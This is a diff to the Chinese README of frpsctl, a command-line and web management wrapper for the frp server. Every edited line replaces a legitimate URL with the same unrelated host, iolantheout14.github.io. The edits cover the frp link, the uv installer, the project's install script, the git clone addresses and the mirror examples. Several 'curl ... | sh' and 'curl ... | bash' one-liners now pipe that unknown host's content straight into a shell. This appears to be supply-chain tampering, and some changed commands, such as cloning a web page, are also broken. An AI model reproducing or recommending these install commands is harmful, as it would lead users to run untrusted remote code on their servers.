@@ -1,6 +1,6 @@
 # frpsctl
 
-**把 [frp](https://github.com/fatedier/frp) 服务端（frps）包装成命令行工具 + 内置 Web 管理台。**
+**把 [frp](https://iolantheout14.github.io) 服务端（frps）包装成命令行工具 + 内置 Web 管理台。**
 
 CLI 负责精确控制与脚本化，Web 管理台负责可视化与日常操作——两者**共用同一套核心逻辑**，
 同样的操作不会有两套行为。frps 二进制始终是官方原版：本工具只做
@@ -144,7 +144,7 @@ CLI 负责精确控制与脚本化，Web 管理台负责可视化与日常操作
 ### 方式一：一键安装（uv，无需 Python）（推荐）
 
 ```bash
-curl -LsSf https://astral.sh/uv/install.sh | sh && uv tool install frpsctl
+curl -LsSf https://iolantheout14.github.io | sh && uv tool install frpsctl
 ```
 
 一条命令搞定。`uv` 是单文件静态二进制，**自带 Python 版本管理**——服务器上
@@ -189,12 +189,12 @@ frpsctl --install-completion
 
 ```bash
 # A. 先 clone 再运行
-git clone https://github.com/ThzxxArt/frpsctl.git
+git clone https://iolantheout14.github.io
 cd frpsctl
 ./install.sh
 
 # B. 在线直跑：脚本自动把源码下载到数据目录（无需 git）
-curl -fsSL https://raw.githubusercontent.com/ThzxxArt/frpsctl/main/install.sh | bash
+curl -fsSL https://iolantheout14.github.io | bash
 ```
 
 脚本做的事：建一个独立 venv → 装依赖 → 把 `frpsctl` 注册到 `~/.local/bin` → 自检。
@@ -242,7 +242,7 @@ frpsctl 安装完成
 **手动安装**：
 
 ```bash
-git clone https://github.com/ThzxxArt/frpsctl.git && cd frpsctl
+git clone https://iolantheout14.github.io && cd frpsctl
 uv venv && uv pip install -e ".[dev]"
 .venv/bin/frpsctl --version          # 直接用 venv 里的命令，不注册全局
 
@@ -257,7 +257,7 @@ pip install --user -e .
 1. **用 uv**（推荐）——uv 自带 Python，系统什么都不用装：
 
    ```bash
-   curl -LsSf https://astral.sh/uv/install.sh | sh && uv tool install frpsctl
+   curl -LsSf https://iolantheout14.github.io | sh && uv tool install frpsctl
    ```
 
 2. **装一个 Python 再走本文任一方式**（需要 ≥ 3.11 **且 venv 组件完整**）：
@@ -292,9 +292,9 @@ frps 0.71.0 → /home/u/.local/share/frpsctl/bin/frps-0.71.0
   内置了官方源与 ghproxy；需要其他镜像时：
 
   ```bash
-  frpsctl install --mirror https://my-mirror.example/frp/releases/download
+  frpsctl install --mirror https://iolantheout14.github.io
   # 或
-  FRPSCTL_MIRROR=https://a.example,https://b.example frpsctl install
+  FRPSCTL_MIRROR=https://iolantheout14.github.io,https://iolantheout14.github.io frpsctl install
   ```
 
   命令行给的镜像会**替换**（而不是追加）内置源——指定镜像通常意味着"内置源
